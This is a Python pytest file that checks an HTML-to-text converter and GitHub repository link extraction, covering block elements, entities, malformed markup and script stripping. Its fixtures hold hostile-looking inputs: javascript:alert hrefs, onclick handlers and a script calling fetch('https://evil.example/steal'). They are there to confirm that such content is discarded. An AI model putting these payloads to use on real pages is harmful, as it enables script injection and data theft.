"""Tests for HTML-to-text conversion and link recovery.

Two failure modes are expensive here and neither announces itself:

  * a dropped `href` is a project that can never be published — the repository was
    only ever in the attribute, and after conversion nothing downstream can know it
    existed;
  * a swallowed skip counter (an unclosed or self-closed `<script>`) silently
    discards the rest of a post's text.

So the anchor and script cases are pinned individually rather than covered by one
happy-path example. Table-driven because the input space is "all HTML".
"""

from __future__ import annotations

import pytest

from linuxdo_oss.domain.github_url import extract_repository_candidates
from linuxdo_oss.feeds.html_text import html_to_text

# ----------------------------------------------------------------------
# html_to_text
# ----------------------------------------------------------------------

TEXT_CASES = [
    # -- nothing ------------------------------------------------------
    ("", ""),
    ("   \n\t ", ""),
    ("&nbsp;", ""),
    # -- plain text and whitespace ------------------------------------
    ("plain text", "plain text"),
    ("a   \n\t  b", "a\nb"),
    ("a     b", "a b"),
    ("a\n\n\n\nb", "a\n\nb"),
    # -- block elements -----------------------------------------------
    ("<p>one</p><p>two</p>", "one\n\ntwo"),
    ("<div>a</div><div>b</div>", "a\n\nb"),
    # A block element followed by loose text is one break, not a paragraph gap.
    ("<h2>标题</h2>正文", "标题\n正文"),
    ("<blockquote>quoted</blockquote>after", "quoted\nafter"),
    # A list is one line per item; the paragraph rule would double-space it.
    ("<ul><li>x</li><li>y</li></ul>", "x\ny"),
    ("<table><tr><td>a</td><td>b</td></tr></table>", "a\nb"),
    # <pre> keeps its own newlines because horizontal whitespace is collapsed and
    # newlines are not.
    ("<pre>a\n  b</pre>", "a\nb"),
    ("<pre><code>make build</code></pre>", "make build"),
    # -- <br> ----------------------------------------------------------
    ("a<br>b", "a\nb"),
    # A self-closing break is ONE newline: the inherited startendtag handling would
    # emit two and invent a paragraph split.
    ("a<br/>b", "a\nb"),
    ("a<br />b", "a\nb"),
    # -- inline elements do not break lines ----------------------------
    ("<p>a <b>bold</b> c</p>", "a bold c"),
    ("<p><em><strong>深</strong>嵌套</em>文本</p>", "深嵌套文本"),
    # -- entities -------------------------------------------------------
    ("&amp; &lt;tag&gt; &nbsp; &#x2F;", "& <tag> /"),
    ("&#20320;&#22909;", "你好"),
    ("Tom &amp; Jerry&#39;s", "Tom & Jerry's"),
    # -- script / style --------------------------------------------------
    ("<p>ok</p><script>var x = '<b>no</b>';</script>", "ok"),
    ("<style>p{color:red}</style>visible", "visible"),
    ("<script>a</script>b<script>c</script>d", "bd"),
    # A stray end tag must not drive the counter negative and swallow a later block.
    ("</script>text<script>hidden</script>tail", "texttail"),
    # `<script/>` is invalid HTML but reachable from hostile input; without the
    # balanced startendtag handling everything after it would disappear.
    ("<script/>after", "after"),
    ("<style/>after", "after"),
    # -- comments, declarations, attributes ------------------------------
    ("a<!-- secret -->b", "ab"),
    ("<!DOCTYPE html><p>a</p>", "a"),
    ('<p onclick="return confirm(1)">正文</p>', "正文"),
    ('<p>看图<img src="x.png" alt="替代文字"></p>', "看图"),
    # -- malformed --------------------------------------------------------
    ("<p>unclosed <b>bold", "unclosed bold"),
    ("<p>a</p></div></p>", "a"),
    # -- anchors -----------------------------------------------------------
    # Anchor text is already the URL: appending would duplicate it.
    (
        '<a href="https://github.com/o/r">https://github.com/o/r</a>',
        "https://github.com/o/r",
    ),
    # Anchor text is not the URL: the href is the only copy of the project.
    ('<a href="https://github.com/o/r">仓库地址</a>', "仓库地址 https://github.com/o/r"),
    (
        '<a href="https://github.com/o/r"><b>点我</b></a>',
        "点我 https://github.com/o/r",
    ),
    ('<a href="HTTPS://GitHub.com/o/r">看</a>', "看 HTTPS://GitHub.com/o/r"),
    # Not absolute http(s) — the canonicalizer could never accept it, so appending
    # it would be noise.
    ('<a href="/t/topic/1">主题</a>', "主题"),
    ('<a href="javascript:alert(1)">x</a>', "x"),
    ('<a href="#anchor">x</a>', "x"),
    ("<a>x</a>", "x"),
    ('<a href="">x</a>', "x"),
    # Broken anchor markup still has to yield the href.
    ('<a href="https://github.com/o/r">看这里', "看这里 https://github.com/o/r"),
    ('<a href="https://github.com/o/r"/>tail', "https://github.com/o/r tail"),
    (
        '<a href="https://github.com/o/r" onclick="return confirm(1)">链接</a>',
        "链接 https://github.com/o/r",
    ),
    # An anchor inside a skipped element contributes neither text nor href.
    ('<script><a href="https://github.com/evil/repo">x</a></script>ok', "ok"),
]


@pytest.mark.parametrize(("html", "expected"), TEXT_CASES)
def test_html_to_text(html: str, expected: str) -> None:
    assert html_to_text(html) == expected


def test_the_appended_href_is_still_a_repository_candidate() -> None:
    """The end-to-end reason the href is kept: the canonicalizer must find it in the
    converted text, because that text is all the classifier ever sees."""
    text = html_to_text(
        '<p>看看这个<a href="https://github.com/Owner/Repo/issues/12">项目</a>。</p>'
    )

    candidates = extract_repository_candidates(text)

    assert [candidate.canonical_url for candidate in candidates] == [
        "https://github.com/owner/repo"
    ]


def test_a_url_glued_to_cjk_text_is_still_extractable() -> None:
    """The reason the appended href is padded with spaces: the extractor refuses a
    URL preceded by a word character."""
    text = html_to_text('<p>见<a href="https://github.com/owner/repo">仓库</a>，谢谢</p>')

    assert extract_repository_candidates(text)


def test_script_body_does_not_reach_the_text() -> None:
    """Script content is code, not post content, and it would otherwise be fed to
    the LLM verbatim."""
    text = html_to_text("<p>正文</p><script>fetch('https://evil.example/steal')</script>")

    assert text == "正文"
    assert "evil.example" not in text
